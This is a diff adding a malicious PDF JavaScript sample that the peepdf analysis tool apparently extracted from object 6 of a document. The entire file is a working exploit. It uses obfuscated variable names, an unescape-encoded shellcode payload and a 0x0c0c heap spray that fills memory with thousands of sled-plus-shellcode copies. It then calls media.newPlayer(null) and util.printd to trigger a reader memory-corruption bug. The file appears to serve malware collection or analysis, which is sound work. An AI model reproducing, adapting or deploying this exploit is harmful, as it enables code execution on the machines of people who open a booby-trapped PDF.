@@ -1,0 +1,22 @@
+// peepdf comment: Javascript code located in object 6 (version 0)
+
+var TjO = unescape("%u4bbe%ud18c%u2930%ub1c9%ud95c%ud9c0%u2474%u5ff4%uef83%u31fc%u0d77%u7703%ue20d%u67be%u6ac1%u4b0a%uec2b%u9733%u71aa%ue277%u9335%u198d%ubc40%u219a%uc3b4%u922c%ua5d2%ue955%ued18%u77cc%u977b%u511c%ubae9%ue4c9%ua926%u76d0%u8c54%u92f0%u1cfc%ue519%uba1e%uf88b%u0207%u9fd1%ua2d5%uf568%u83ae%uc2bc%uba5d%ub1da%ua973%ua229%u47b4%u20f2%u58a5%ua1ca%uc598%uae0e%u3654%u9668%ue287%uc666%u9015%ub0dc%u3f1d%ueab8%uc08e%u7a2a%ue03c%ue6cf%u461b%u8db7%u2e06%u2b55%u95ac%u284b%u47c3%uf171%u8574%ufecc%u6ae6%uc9bf%uf280%ud0a6%u90ed%u2b13%u5777%u77c6%u266a%ue0fb%ud94b%u895f%u83d5%uf585%u7c6f%u1066%u9ad7%u4074%u320e%u409d%u392a%u5c24%u320e%uabef%u7af6%u727a%u186a%u7241%ue123%u5e17%u87d6%u9c46%u2e7e%u0422%u9848%u78f8%u7d83%ue332%uc706%u2603%u0940%u7efa%u5beb%u2a91%u56ad%u7275%uf9a2%u4f4d%u30f5%u1b2b%u05c9%ue081%u2fba%u4cbc%u8f34%u1758%u31d0%u3a58%u25d5%u3f56%u443e%u2b6b%u5d43%u3579%u5e62%u8c90%u757b%ued87%u5788%ue5a7%u928d%u0caa%u8386%u68ec%ub497%u57fb%uc9c9%uf1f9%ud3d6%uec0d%ue22a%u1306%uf84c%u3941%ufb5b%u178c%u0754%u6085%u187e%u0881%u326d%udfc4%u3298%uecbf%u68ae%u1a62%u64de%u1569%u76e7%u2c5c%u79c7%u2dab%ue020%uba3b%u63a5%u6d81%uea69%u0494%u9b01%uc933%u348a%u3ad6%ube3d%u315c%u6ec4%uc1f9%uef53");
+var OAcvvAsADIIVltEkWHVDTDLeEGxLSpfrjVfpCaZOQKcgQrwWvgvjaCfmZRLSJa = unescape("%u0c0c%u0c0c");
+var AEAsKfuwpAOqxdASdciMevegkDZ = unescape("%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u0c0c%u5174%u4c67%u4e6f%u6352%u6242%u7a67%u7470%u6a58%u776a%u7a70%u5866%u5767%u5372%u6a42%u6e58%u4143%u6245%u744a%u7556%u7154%u434c%u6673%u4644%u664a%u685a%u7947%u6871%u5446");
+
+while (OAcvvAsADIIVltEkWHVDTDLeEGxLSpfrjVfpCaZOQKcgQrwWvgvjaCfmZRLSJa.length <= 32768) OAcvvAsADIIVltEkWHVDTDLeEGxLSpfrjVfpCaZOQKcgQrwWvgvjaCfmZRLSJa += OAcvvAsADIIVltEkWHVDTDLeEGxLSpfrjVfpCaZOQKcgQrwWvgvjaCfmZRLSJa;
+OAcvvAsADIIVltEkWHVDTDLeEGxLSpfrjVfpCaZOQKcgQrwWvgvjaCfmZRLSJa = OAcvvAsADIIVltEkWHVDTDLeEGxLSpfrjVfpCaZOQKcgQrwWvgvjaCfmZRLSJa.substring(0, 32768 - TjO.length);
+
+memory = new Array();
+
+for (i = 0; i < 0x2000; i++) {
+    memory[i] = OAcvvAsADIIVltEkWHVDTDLeEGxLSpfrjVfpCaZOQKcgQrwWvgvjaCfmZRLSJa + TjO;
+}
+
+util.printd("kPaVssGRNdFmgHQxMpweLvplZibWXQRfKeLO", new Date());
+util.printd("pudjaHYFjgzcmHizuWIfnuTuXmmaSbzYRPYk", new Date());
+try {
+    this.media.newPlayer(null);
+} catch (e) {}
+util.printd(AEAsKfuwpAOqxdASdciMevegkDZ, new Date());
+
